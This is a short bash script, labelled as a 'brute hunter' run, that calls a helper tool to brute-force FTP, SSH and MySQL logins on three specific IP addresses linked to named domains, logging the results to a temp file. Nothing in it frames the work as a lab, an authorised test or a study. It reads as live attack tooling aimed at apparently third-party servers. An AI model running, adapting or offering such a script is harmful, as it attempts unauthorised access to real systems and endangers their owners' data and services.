#!/bin/bash
# brute hunter5 domain targets
LOG=/tmp/brute_h5.log
echo "=== BRUTE H5 $(date) ===" >> $LOG
# 164580.com FTP+SSH
echo "[1] 164580.com" >> $LOG
timeout 400 /opt/msray/brute_util.sh 118.178.131.70 ftp >> $LOG 2>&1
timeout 400 /opt/msray/brute_util.sh 118.178.131.70 ssh >> $LOG 2>&1
# aokechina.cn FTP+SSH
echo "[2] aokechina.cn" >> $LOG
timeout 400 /opt/msray/brute_util.sh 103.45.248.151 ftp >> $LOG 2>&1
timeout 400 /opt/msray/brute_util.sh 103.45.248.151 ssh >> $LOG 2>&1
# anzerclub MySQL+FTP
echo "[3] anzerclub.com" >> $LOG
timeout 400 /opt/msray/brute_util.sh 210.16.188.131 mysql >> $LOG 2>&1
timeout 400 /opt/msray/brute_util.sh 210.16.188.131 ftp >> $LOG 2>&1
echo "=== DONE $(date) ===" >> $LOG
